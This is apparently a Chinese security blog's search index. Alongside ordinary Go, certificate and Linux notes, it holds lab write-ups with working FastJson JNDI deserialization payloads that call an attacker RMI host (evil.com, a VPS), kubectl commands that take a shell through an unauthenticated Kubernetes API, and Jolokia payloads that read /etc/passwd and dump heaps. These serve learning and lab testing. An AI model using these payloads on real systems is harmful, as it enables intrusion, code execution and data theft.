<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Go 入门踩坑</title>
    <url>/2021/05/28/Go-%E5%85%A5%E9%97%A8%E8%B8%A9%E5%9D%91/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近心血来潮，觉得Go可能在后续的职业生涯中发挥作用，就来学一下Go吧。</p>
<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><h4 id="下载安装Go"><a href="#下载安装Go" class="headerlink" title="下载安装Go"></a>下载安装Go</h4><p>这里不多说了，直接到官网下载msi包，然后双击运行安装即可，我这里下载的是<code>go1.16.4.windows-amd64.msi</code>。</p>
<a id="more"></a>
<h4 id="VS-Code-配置Go开发环境"><a href="#VS-Code-配置Go开发环境" class="headerlink" title="VS Code 配置Go开发环境"></a>VS Code 配置Go开发环境</h4><p>首先安装Go的语言拓展<br><img data-src="/2021/05/28/Go-%E5%85%A5%E9%97%A8%E8%B8%A9%E5%9D%91/2021-05-28-10-40-38.png"></p>
<p>然后安装Go语言开发工具包<br><img data-src="/2021/05/28/Go-%E5%85%A5%E9%97%A8%E8%B8%A9%E5%9D%91/2021-05-28-10-41-50.png"><br>勾选全部工具<br><img data-src="/2021/05/28/Go-%E5%85%A5%E9%97%A8%E8%B8%A9%E5%9D%91/2021-05-28-10-42-56.png"></p>
<p> VS Code此时会下载并安装上图列出来的16个工具，但是由于国内的网络环境基本上都会出现安装失败<br> <img data-src="/2021/05/28/Go-%E5%85%A5%E9%97%A8%E8%B8%A9%E5%9D%91/2021-05-28-10-44-39.png"></p>
<p> 这个时候当然是配置代理啦，按照网上的教程，大多都会看到说在命令行设置代理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>

<p> 这里反复尝试之后发现不行，看输出可以发现，VS Code还是请求了官方的地址，所以可知我们配置的代理不生效，然后翻看一下VS Code的设置，可以看到有个<code>Tools Env Vars</code>的配置，猜想它是配置这个Go工具包的环境变量的<br> <img data-src="/2021/05/28/Go-%E5%85%A5%E9%97%A8%E8%B8%A9%E5%9D%91/2021-05-28-10-55-55.png"></p>
<p> 然后把网上教程中让我们设置的两个环境变量改成json格式写进去就行了，记得VS Code的配置文件是json格式的，所以如果原本上面有配置的，需要在前面加个逗号<code>,</code><br> <figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;go.toolsEnvVars&quot;: &#123;&quot;GO111MODULE&quot;: &quot;on&quot;, &quot;GOPROXY&quot;: &quot;https://goproxy.cn,direct&quot;&#125;</span><br></pre></td></tr></table></figure><br> <img data-src="/2021/05/28/Go-%E5%85%A5%E9%97%A8%E8%B8%A9%E5%9D%91/2021-05-28-10-58-47.png"></p>
<p> 配置完成后再次按照前面的步骤安装工具包即可。</p>
<h3 id="go-导入本地包"><a href="#go-导入本地包" class="headerlink" title="go 导入本地包"></a>go 导入本地包</h3><p>go mod 导入本地包，先下载源码，如下载github.com/pretty66/websocketproxy到本地myproject/libs/websocketproxy。</p>
<p>然后修改myproject/go.mod，增加一行：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">replace github.com/pretty66/websocketproxy =&gt; ./libs/websocketproxy</span><br></pre></td></tr></table></figure>

<p><img data-src="/2021/05/28/Go-%E5%85%A5%E9%97%A8%E8%B8%A9%E5%9D%91/image-20230308162946444.png"></p>
<p>然后自己的代码照常import就行</p>
<p><img data-src="/2021/05/28/Go-%E5%85%A5%E9%97%A8%E8%B8%A9%E5%9D%91/image-20230308163011841.png"></p>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>DER证书转换PEM证书小记</title>
    <url>/2021/11/13/DER%E8%AF%81%E4%B9%A6%E8%BD%AC%E6%8D%A2PEM%E8%AF%81%E4%B9%A6%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>或许是因为强迫症使然，产生了让xray使用burp的想法，至于为什么要这么做，也说不上原因，就感觉这样搞了舒服点。因为xray不支持burp默认的DER格式证书，所以直接使用会碰到未找到PEM 数据的问题，所以需要做一下转换，将DER转成PEM。<br><img data-src="/2021/11/13/DER%E8%AF%81%E4%B9%A6%E8%BD%AC%E6%8D%A2PEM%E8%AF%81%E4%B9%A6%E5%B0%8F%E8%AE%B0/2021-11-13-18-56-44.png"></p>
<a id="more"></a>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>首先分别导出burpsuite的公钥与私钥，记住是分别导出<br><img data-src="/2021/11/13/DER%E8%AF%81%E4%B9%A6%E8%BD%AC%E6%8D%A2PEM%E8%AF%81%E4%B9%A6%E5%B0%8F%E8%AE%B0/2021-11-13-19-02-03.png"><br>为防止有英文学习不好的，还是截下图<br><img data-src="/2021/11/13/DER%E8%AF%81%E4%B9%A6%E8%BD%AC%E6%8D%A2PEM%E8%AF%81%E4%B9%A6%E5%B0%8F%E8%AE%B0/2021-11-13-19-02-58.png"><br>导出的公钥文件名为<code>burp.ca.crt</code>，私钥文件名为<code>burp.ca.key</code><br>然后转换公钥文件格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl x509 -<span class="keyword">in</span> burp.ca.crt -inform der -outform pem -out burp_cert.pem</span><br></pre></td></tr></table></figure>
<p>转换私钥文件格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl rsa -inform DER -outform PEM -<span class="keyword">in</span> burp.ca.key -out burp_key.pem</span><br></pre></td></tr></table></figure>
<p>然后修改xray的<code>config.yaml</code>配置文件<br><img data-src="/2021/11/13/DER%E8%AF%81%E4%B9%A6%E8%BD%AC%E6%8D%A2PEM%E8%AF%81%E4%B9%A6%E5%B0%8F%E8%AE%B0/2021-11-13-19-05-41.png"><br>这个时候浏览器挂上xray代理用的就是burp的证书了<br><img data-src="/2021/11/13/DER%E8%AF%81%E4%B9%A6%E8%BD%AC%E6%8D%A2PEM%E8%AF%81%E4%B9%A6%E5%B0%8F%E8%AE%B0/2021-11-13-18-55-20.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://support.huaweicloud.com/scm_faq/scm_01_0128.html">https://support.huaweicloud.com/scm_faq/scm_01_0128.html</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson RCE实验笔记</title>
    <url>/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="FastJson-1-2-24"><a href="#FastJson-1-2-24" class="headerlink" title="FastJson 1.2.24"></a>FastJson 1.2.24</h3><h4 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h4><p>本次实验使用了<code>Vulhub</code>的<code>fastjson 1.2.24 反序列化导致任意命令执行漏洞</code>，漏洞利用使用了<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>，漏洞地址为<code>http://192.168.154.130:8090</code>。</p>
<h4 id="启动漏洞环境"><a href="#启动漏洞环境" class="headerlink" title="启动漏洞环境"></a>启动漏洞环境</h4><p>因为用了docker的漏洞环境，所以请先安装<code>docker</code>及<code>docker-compose</code>，此处不再赘述。在靶机运行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/fastjson/1.2.24-rce/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-10-51-27.png"><br>启动后可访问FastJson的服务：<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-10-52-07.png"></p>
<a id="more"></a>
<h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>这里使用了burpsuite的BurpFastJsonScan插件：<a href="https://github.com/pmiaowu/BurpFastJsonScan%E3%80%82">https://github.com/pmiaowu/BurpFastJsonScan。</a><br>经过扫描可以看到存在漏洞：<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-10-56-47.png"></p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>首先要启动一个<code>RMI</code>或者<code>LDAP</code>服务，我这里使用的是<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>，相对<code>marshalsec</code>来说它的操作步骤要少一些。</p>
<p><strong><code>JNDI-Injection-Exploit</code>的官方说明如下：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</span><br><span class="line"></span><br><span class="line">-C - 远程class文件中要执行的命令。</span><br><span class="line"></span><br><span class="line">（可选项 , 默认命令是mac下打开计算器，即&quot;open &#x2F;Applications&#x2F;Calculator.app&quot;）</span><br><span class="line"></span><br><span class="line">-A - 服务器地址，可以是IP地址或者域名。</span><br><span class="line"></span><br><span class="line">（可选项 , 默认地址是第一个网卡地址）</span><br></pre></td></tr></table></figure>
<p>为了方便和安全起见，我使用了<code>docker</code>来启动它。先把<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>下载到<code>/root/tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>，在vps上启动命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -itd  --rm -p 8180:8180 -p 1099:1099 -p 1389:1389 -v /root/tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar:/root/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar java java -jar /root/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;ping jndi.265orc.dnslog.cn&quot;</span> -A 1xx.xx.xx.xx6</span><br></pre></td></tr></table></figure>
<p>然后通过<code>docker logs</code>命令查询容器输出日志，这里的<code>13</code>是容器的id，在上条命令执行完毕后会输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker logs 13</span><br></pre></td></tr></table></figure>
<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-09-57.png"></p>
<p>在burp抓包后放入poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://1xx.xx.xx.xx6:1099/07l8x5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-13-15.png"></p>
<p>dnslog中可以看到命令执行成功<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-14-47.png"></p>
<p>ldap协议的利用方式也是相同：<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-21-45.png"></p>
<h3 id="FastJson-1-2-47"><a href="#FastJson-1-2-47" class="headerlink" title="FastJson 1.2.47"></a>FastJson 1.2.47</h3><h4 id="启动漏洞环境-1"><a href="#启动漏洞环境-1" class="headerlink" title="启动漏洞环境"></a>启动漏洞环境</h4><p><code>FastJson 1.2.47</code>的漏洞环境<code>Vulhub</code>也有，所以步骤相似：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ../1.2.247-rce/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-39-21.png"></p>
<h4 id="漏洞扫描-1"><a href="#漏洞扫描-1" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>同样是使用BurpFastJsonScan插件扫描，这次插件却在一开始并没有扫出来，需要手动POST一个json包后才开始了扫描，可能跟插件工作逻辑有关。<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-50-43.png"></p>
<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-52-16.png"></p>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>漏洞利用还是使用上一节用到的<code>JNDI-Injection-Exploit</code>，exp如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://evil.com:9999/Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-12-01-02.png"><br>因为在上一节的测试中发现<code>dnslog.cn</code>生成的随机域名有效期比较短，容易导致明明命令执行了却看不到dnslog的问题，所以改用了<code>ceye.io</code>测试，可以看到靶机curl请求了<code>ceye.io</code>的http服务：<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-12-01-35.png"></p>
<h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>对版本小于1.2.48的版本通杀，autoType为关闭状态也可用。方法同上，直接打了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line"> <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line"> <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"> &#125;, </span><br><span class="line"> <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line"> <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line"> <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://evil.com:9999/Exploit&quot;</span>, </span><br><span class="line"> <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-13-53-08.png"><br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-13-53-33.png"></p>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>其它几个fastjson版本的exp需要autoTypeSupport属性为true才能使用，而fastjson&gt;=1.2.25默认为false，相对碰到的情况应该比较少，不一一尝试。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/articles/web/283585.html">https://www.freebuf.com/articles/web/283585.html</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes Api Server 未授权访问漏洞GetShell</title>
    <url>/2019/08/05/Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="下载kubectl客户端"><a href="#下载kubectl客户端" class="headerlink" title="下载kubectl客户端"></a>下载kubectl客户端</h3><p>参考<a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/#install-kubectl-on-windows">官方文档</a><br>因为官方从Google下载，国内下载可能比较困难，这里提供一个Windows版本的kubectl客户端（<a href="https://github.com/ryanInf/ryaninf.github.io/releases/download/kubectl.exe/kubectl.exe">下载地址</a>)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MD5:eb9039d1285045b48313766aebf3558e *kubectl.exe</span><br></pre></td></tr></table></figure>
<h3 id="获取容器shell"><a href="#获取容器shell" class="headerlink" title="获取容器shell"></a>获取容器shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubtctl.exe -s ip:port get pods</span><br><span class="line">kubectl.exe -s ip:port --namespace&#x3D;default exec -it &lt;CONTAINER ID&gt; bash</span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/08/05/Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/2020-08-20-16-56-00.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://moyu.life/post/kubernetes-api-server-wei-shou-quan-fang-wen-lou-dong/">Kubernetes Api Server 未授权访问漏洞</a></p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux命令备忘</title>
    <url>/2020/01/03/Linux%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/</url>
    <content><![CDATA[<h3 id="Linux命令备忘"><a href="#Linux命令备忘" class="headerlink" title="Linux命令备忘"></a>Linux命令备忘</h3><ol start="0">
<li>xargs占位符<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> aaa |xargs -I &#123;&#125; python3 test.py &#123;&#125; &#123;&#125;.xlsx</span><br></pre></td></tr></table></figure></li>
<li>查看进程启动时间<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -eo pid,lstart,etime,cmd | grep nginx</span><br></pre></td></tr></table></figure></li>
<li>找出大于500m的文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -size +500M -print0 |xargs -0 ls -l</span><br></pre></td></tr></table></figure></li>
<li>Debian显示已安装的软件包<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure>
<a id="more"></a></li>
<li>批量杀进程<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux |grep hydra |awk <span class="string">&#x27;&#123;printf &quot;%s\n&quot;, $2&#125;&#x27;</span> |xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure></li>
<li>apt-get配置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://192.168.137.1:1080</span><br></pre></td></tr></table></figure></li>
<li>wget设置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.5.2/Python-3.5.2rc1.tgz -e <span class="string">&#x27;https_proxy=http://192.168.137.1:1080&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>Debian设置SSH自启动<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d  ssh <span class="built_in">enable</span></span><br></pre></td></tr></table></figure></li>
<li>Kali设置阿里云源<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">修改/etc/apt/sources.list文件为以下内容：</span><br><span class="line">deb https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure></li>
<li>查找重复行并统计出现次数，例：统计各IP出现次数 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat ip.txt |grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][ 0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>  |sort |uniq -c &gt; ipncount.txt</span><br></pre></td></tr></table></figure>




</li>
</ol>
<h3 id="本文持续更新"><a href="#本文持续更新" class="headerlink" title="本文持续更新"></a>本文持续更新</h3>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Jolokia利用记录</title>
    <url>/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近发现了一个<code>Springboot Actuator Jolokia 未授权访问漏洞</code>，了解了一下感觉挺好玩的，记录一下学习过程。<br>Actuator是Spring Boot提供的服务监控和管理中间件，默认配置会出现接口未授权访问，部分接口会泄露网站流量信息和内存信息等，使用Jolokia库特性甚至可以远程执行任意代码，获取服务器权限。</p>
<a id="more"></a>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h4><p>Jolokia是一款开源产品，用于为JMX（Java Management Extensions）技术提供HTTP API接口。其中，该产品提供了一个API，用于调用在服务器上注册的MBean并读/写其属性。JMX技术用于管理和监视设备、应用程序和网络驱动的服务。</p>
<p>通常我们发现它的时候可能是类似下面的路径：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;actuator&#x2F;jolokia&#x2F;list</span><br></pre></td></tr></table></figure>
<p>响应结果是json格式：<br><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-27-11-05-33.png"></p>
<p>整个json文本的内容非常多，通过vscode美化一下：<br><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-27-11-14-36.png"></p>
<h4 id="请求格式"><a href="#请求格式" class="headerlink" title="请求格式"></a>请求格式</h4><p>jolokia的调用支持GET请求和POST请求格式。</p>
<p><em>GET请求：</em></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base-url</span>&gt;</span>/<span class="tag">&lt;<span class="name">type</span>&gt;</span>/<span class="tag">&lt;<span class="name">arg1</span>&gt;</span>/<span class="tag">&lt;<span class="name">arg2</span>&gt;</span>/..../</span><br></pre></td></tr></table></figure>
<p>如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/jolokia/read/java.lang:type=Memory/HeapMemoryUsage</span><br></pre></td></tr></table></figure>
<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-27-11-30-12.png"></p>
<p><em>POST请求（json）：</em></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;type&quot; : &quot;read&quot;,</span><br><span class="line">  &quot;mbean&quot; : &quot;java.lang:type=Memory&quot;,</span><br><span class="line">  &quot;attribute&quot; : &quot;HeapMemoryUsage&quot;,</span><br><span class="line">  &quot;path&quot; : &quot;used&quot;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-05-03-21-37-24.png"></p>
<h4 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h4><p>那么如何调用MBean进行利用呢？相信看完下面的例子你就会懂了。</p>
<p>首先要理解我们可以做什么操作，Jolokia 可执行的操作（operations）有：<code>read</code>、<code>write</code>、<code>exec</code>、<code>search</code>、<code>list</code>。</p>
<p>比如我要读取<code>java.util.logging</code>下<code>type=Logging</code>的<code>attr</code>里面的<code>LoggerNames</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/actuator/jolokia/<span class="built_in">read</span>/java.util.logging:<span class="built_in">type</span>=Logging/LoggerNames</span><br></pre></td></tr></table></figure>
<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-05-03-21-40-36.png"></p>
<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-27-11-42-35.png"></p>
<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-27-11-33-45.png"></p>
<p>调用某个MBean：<br><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-25-13-37-18.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;actuator&#x2F;jolokia&#x2F;exec&#x2F;com.sun.management:type&#x3D;DiagnosticCommand&#x2F;vmUnlockCommercialFeatures&#x2F;</span><br></pre></td></tr></table></figure>
<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-25-13-33-06.png"></p>
<p>那么，哪些可以<code>read</code>，哪些可以<code>exec</code>呢？</p>
<p>我们可以观察<code>list</code>列出的MBeans字典，<code>attr</code>里面的都可以<code>read</code>、<code>write</code>，<code>op</code>里面的方法都可以<code>exec</code><br><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-05-03-21-47-37.png"></p>
<p>如果要传递参数，则在后面加斜杠<code>/</code>+<code>参数值</code>，如果参数有<code>/</code>或者<code>!</code>等则需要按下表转义：</p>
<table>
<thead>
<tr>
<th>Escaped</th>
<th>Unescaped</th>
</tr>
</thead>
<tbody><tr>
<td><code>!/</code></td>
<td><code>/</code></td>
</tr>
<tr>
<td><code>!!</code></td>
<td><code>!</code></td>
</tr>
<tr>
<td><code>!&quot;</code></td>
<td><code>&quot;</code></td>
</tr>
<tr>
<td><code>!</code><em>(anything else)</em></td>
<td><em>(anything else)</em></td>
</tr>
</tbody></table>
<p>如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;jolokia&#x2F;exec&#x2F;com.sun.management:type&#x3D;HotSpotDiagnostic&#x2F;dumpHeap&#x2F;!&#x2F;tmp!&#x2F;a.hprof&#x2F;0 </span><br></pre></td></tr></table></figure>


<h3 id="一些可能有用的payload"><a href="#一些可能有用的payload" class="headerlink" title="一些可能有用的payload"></a>一些可能有用的payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;jolokia&#x2F;read&#x2F;java.lang:type&#x3D;Runtime&#x2F;SystemProperties</span><br><span class="line">&#x2F;jolokia&#x2F;read&#x2F;com.alibaba.druid:type&#x3D;DruidDataSourceStat&#x2F;DataSourceList</span><br><span class="line">&#x2F;jolokia&#x2F;exec&#x2F;com.sun.management:type&#x3D;DiagnosticCommand&#x2F;compilerDirectivesAdd&#x2F;!&#x2F;etc!&#x2F;passwd</span><br><span class="line">&#x2F;jolokia&#x2F;exec&#x2F;com.sun.management:type&#x3D;HotSpotDiagnostic&#x2F;dumpHeap&#x2F;!&#x2F;tmp!&#x2F;a.hprof&#x2F;0 </span><br></pre></td></tr></table></figure>

<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-05-03-21-57-34.png"></p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>写了个简易脚本去读取所有的attr及执行所有的dump操作，基本上无害，看看能不能发现一些敏感数据：</p>
